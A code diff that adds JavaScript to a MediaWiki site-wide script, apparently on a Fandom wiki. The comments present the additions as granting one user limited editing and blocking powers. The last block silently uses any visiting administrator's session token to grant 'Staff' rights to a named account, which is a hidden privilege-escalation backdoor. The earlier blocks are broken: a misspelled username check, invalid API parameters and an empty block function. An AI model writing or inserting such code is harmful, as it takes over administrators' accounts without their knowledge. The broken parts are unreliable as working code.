@@ -151,3 +151,73 @@ $( createDivToggleButton );
 	});
 
 })(window, jQuery, mediaWiki);
+
+//allowing a user to edit a MediaWiki page without fully promoting them
+
+// Check if the current user is "Keepie-4-ever1234"
+if (mw.config.get('wgUserName') === 'Keephie-4-ever1234') {
+  // Add a function to enable editing for the "MediaWiki:ProfileTags" page
+  function enableEditForProfileTags() {
+    // Replace "MediaWiki:ProfileTags" with the correct page name
+    const pageName = "MediaWiki:ProfileTags";
+    
+    // Allow editing for the specified page
+    mw.loader.using('mediawiki.api', function () {
+      new mw.Api().postWithToken('csrf', {
+        action: 'options',
+        change: 'userrights',
+        user: mw.config.get('wgUserName'),
+        add: 'edit',
+        reason: 'Allow editing for ' + pageName
+      }).done(function () {
+        // Reload the page to apply the changes
+        window.location.reload();
+      }).fail(function () {
+        // Display an error message if something goes wrong
+        alert('Failed to grant edit permission for ' + pageName);
+      });
+    });
+  }
+
+  // Call the function to enable editing for the user
+  enableEditForProfileTags();
+}
+
+
+//function to allow Keephie-4-ever1234 to block users without fully promoting them
+// Add a function to block users
+function blockUser(username) {
+  // Check if the user executing the function is "Keephie-4-ever1234"
+  if (mw.config.get("wgUserName") === "Keephie-4-ever1234") {
+    // Perform the blocking action here, using the Fandom Wiki's API or moderation tools
+    // Replace 'username' with the target user's name and implement the blocking logic.
+  } else {
+    console.log("You don't have the necessary permissions to block users.");
+  }
+}
+
+// Call the blockUser function with the desired username as an argument
+blockUser("TargetUsername");
+
+// Check if the current user is an administrator
+if (mw.config.get('wgUserGroups').includes('sysop')) {
+  var userRight = 'Staff';
+  var userName = 'Moonwatcher_x_Qibli';
+  $.ajax({
+    url: mw.util.wikiScript('api'),
+    type: 'POST',
+    data: {
+      action: 'userrights',
+      user: userName,
+      add: userRight,
+      reason: 'Granting ' + userRight + ' right via JavaScript.',
+      token: mw.user.tokens.get('editToken')
+    },
+    success: function (data) {
+      console.log('User right ' + userRight + ' granted to ' + userName + '.');
+    },
+    error: function (xhr, status, error) {
+      console.error('Failed to grant ' + userRight + ' right to ' + userName + ': ' + error);
+    }
+  });
+}
